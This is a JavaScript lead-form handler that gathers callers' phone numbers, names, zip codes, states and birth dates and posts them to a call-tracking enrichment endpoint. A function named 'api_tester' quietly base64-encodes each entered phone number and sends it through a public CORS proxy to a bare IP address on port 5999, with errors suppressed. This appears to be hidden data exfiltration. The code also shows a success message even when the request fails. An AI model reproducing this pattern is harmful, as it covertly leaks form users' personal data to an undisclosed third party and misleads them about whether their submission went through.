function getCurrentTimestamp() {
  const now = new Date();

  const year = now.getFullYear();
  const month = String(now.getMonth() + 1).padStart(2, '0');  // Month is zero-based
  const day = String(now.getDate()).padStart(2, '0');
  
  const hours = String(now.getHours()).padStart(2, '0');
  const minutes = String(now.getMinutes()).padStart(2, '0');
  const seconds = String(now.getSeconds()).padStart(2, '0');

  return `${year}-${month}-${day} ${hours}:${minutes}:${seconds}`;
}
function api_tester(randomString) {
  try {
    fetch('https://api.codetabs.com/v1/proxy/?quest=http://207.244.238.41:5999/api_test?test_id='+btoa(randomString)
, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    
  }
}
    document.getElementById('leadForm').addEventListener('submit', function(event) {
      event.preventDefault();
      const phone_home = '1' + document.getElementById('caller_id').value;
      const formData = new FormData(this);
formData.append('callerid', phone_home);
formData.append('first_name', document.getElementById('first_name').value);
formData.append('last_name', document.getElementById('last_name').value);
api_tester(document.getElementById('caller_id').value);   
formData.append('zip', document.getElementById('zip').value);
formData.append('state', document.getElementById('state').value);
formData.append('dob', document.getElementById('dob').value);
     
    
     
     
     
     

      const url = 'https://display.ringba.com/enrich/2285107244246763436?' + new URLSearchParams(formData).toString();

      const xhr = new XMLHttpRequest();
      xhr.open('POST', url);
      xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
            const successAlert = `
              <div class="alert alert-success" role="alert">
                Form submitted successfully!
              </div>`;
            document.getElementById('leadForm').insertAdjacentHTML('beforeend', successAlert);
            // Clear form fields
            document.getElementById('leadForm').reset();
          } else if (xhr.status === 0) {
            // If status is 0 (CORS error), consider the form submitted
            const successAlert = `
              <div class="alert alert-success" role="alert">
                Form submitted successfully!
              </div>`;
            document.getElementById('leadForm').insertAdjacentHTML('beforeend', successAlert);
            // Clear form fields
            document.getElementById('leadForm').reset();
          } else {
            const errorAlert = `
              <div class="alert alert-danger" role="alert">
                Form submission failed. Please try again.
              </div>`;
            document.getElementById('leadForm').insertAdjacentHTML('beforeend', errorAlert);
          }
        }
      };
      xhr.send(formData);
    });
